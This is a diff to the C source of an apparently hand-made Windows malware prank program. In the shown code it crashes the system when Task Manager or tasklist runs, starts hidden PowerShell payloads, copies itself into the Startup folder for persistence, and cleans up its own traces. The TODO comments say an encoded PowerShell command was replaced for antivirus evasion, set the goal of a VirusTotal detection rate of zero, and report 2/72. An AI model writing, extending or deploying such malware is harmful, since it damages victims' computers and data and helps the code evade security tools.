@@ -42,7 +42,7 @@ void CrashSystem()
 void SelfDefence()
 {
 	char *TaskManager = "Taskmgr.exe";
-	char *CMD = "cmd.exe";
+	char *tasklist = "tasklist.exe";
 
 	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	PROCESSENTRY32 pe;
@@ -51,7 +51,7 @@ void SelfDefence()
 
 	while (b)
 	{
-		if (strcmp(pe.szExeFile, TaskManager) == 0 || strcmp(pe.szExeFile, CMD) == 0)
+		if (strcmp(pe.szExeFile, TaskManager) == 0 || strcmp(pe.szExeFile, tasklist) == 0)
 		{
 			CrashSystem();
 			return;
@@ -114,12 +114,14 @@ void OpenPrograms(int RandomProgram)
 void Payloads()
 {
 	/*
-		$PlayWav=New-Object System.Media.SoundPlayer
-		$PlayWav.SoundLocation="$env:USERPROFILE\\music.wav"
+		$PlayWav = New-Object System.Media.SoundPlayer;
+		$MusicPath = "$env:USERPROFILE\\music.wav";
+		$PlayWav.SoundLocation = $MusicPath;
 		$PlayWav.playsync()
 	*/
 
-	ShellExecute(NULL, "open", "powershell.exe", "-exec bypass -enc JABQAGwAYQB5AFcAYQB2AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATQBlAGQAaQBhAC4AUwBvAHUAbgBkAFAAbABhAHkAZQByADsAJABQAGwAYQB5AFcAYQB2AC4AUwBvAHUAbgBkAEwAbwBjAGEAdABpAG8AbgA9ACIAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQBcAFwAbQB1AHMAaQBjAC4AdwBhAHYAIgA7ACQAUABsAGEAeQBXAGEAdgAuAHAAbABhAHkAcwB5AG4AYwAoACkA", NULL, SW_HIDE);
+	// bruh those escape characters are so annoying lol
+	ShellExecute(NULL, "open", "cmd.exe", "/c powershell.exe \"$PlayWav = New-Object System.Media.SoundPlayer; $MusicPath = \\\"$env:USERPROFILE\\\\music.wav\\\"; $PlayWav.SoundLocation = $MusicPath; $PlayWav.playsync()\"", NULL, SW_HIDE);
 
 	for (int i = 0; i < 69; i++)
 	{
@@ -147,7 +149,7 @@ void RestoreEverything(char *DeleteFilePath, char *MusicPath, char *BackgroundIm
 
 	char TempFile[MAX_PATH];
 	GetEnvironmentVariable("TEMP", TempFile, MAX_PATH);
-	strcat(TempFile, "\\DELETE_ME");
+	strcat(TempFile, "\\DELETE");
 
 	if (GetFileAttributes(TempFile) != INVALID_FILE_ATTRIBUTES)
 	{
@@ -155,6 +157,7 @@ void RestoreEverything(char *DeleteFilePath, char *MusicPath, char *BackgroundIm
 	}
 
 	MoveFile(StartupExecutable, TempFile);
+	ShellExecute(NULL, "open", "cmd.exe", "/c start /b \"\" powershell.exe Start-Sleep -Seconds 3; Remove-Item $env:TEMP\\DELETE -Force -ErrorAction SilentlyContinue", NULL, SW_HIDE);
 }
 
 int main(void)
@@ -203,7 +206,7 @@ int main(void)
 	}
 
 	if (MessageBox(NULL, "If you see this message without knowing what you have just executed, just press No and nothing will happen.", "Would you like to run this program?", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDYES &&
-		MessageBox(NULL, "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THE USE OF THIS PROGRAM!\r\n\r\nEXECUTE IT ANYWAY?",
+		MessageBox(NULL, "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THE USE OF THIS PROGRAM!\r\n\r\nIF YOU STILL WANT TO RUN THIS FILE, PLEASE SAVE ALL UNSAVED FILES (ETC.)!\r\n\r\nEXECUTE IT ANYWAY?",
 				   "THIS IS THE LAST WARNING!", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDYES)
 	{
 		MoveFile(CurrentExecutable, StartupExecutable);
@@ -215,16 +218,20 @@ int main(void)
 }
 
 /* TODO
-	- adding method to remove the leftover from temp
-	- adding method to choose between BSOD or doing nothing
-	- replacing the encoded powershell script (av evasion)
-	
-	- compiling project using tcc instead of gcc
-		-> using linker instead of incbin asm (tcc doesn't like incbin)
-			-> ld -r -b binary -o wallpaper.o wallpaper.png
+DONE			- adding method to remove the leftover from temp
+DONE (warning)	- adding method to choose between BSOD or doing nothing
+DONE			- replacing the encoded powershell script (av evasion)
 
-	- maybe adding more payloads (MessageBoxes, etc.)
-	- maybe add a highscore system like in "Rensenware"
-	- maybe adding a different song instead (satanic)
-	- maybe getting the VirusTotal detection rate to 0
+				- compiling project using tcc instead of gcc
+					-> using linker instead of incbin asm (tcc doesn't like incbin)
+						->	ld -r -b binary -o wallpaper.o wallpaper.png
+							extern const int _binary_wallpaper_png_size;
+							extern const char _binary_wallpaper_png_end;
+							extern const char _binary_wallpaper_png_start;
+
+				- maybe adding more payloads (MessageBoxes, etc.)
+				- maybe add a highscore system like in "Rensenware"
+				- maybe adding a different song instead (satanic vibes)
+				- maybe getting the VirusTotal detection rate to 0
+					- current detection rate: 2/72
 */
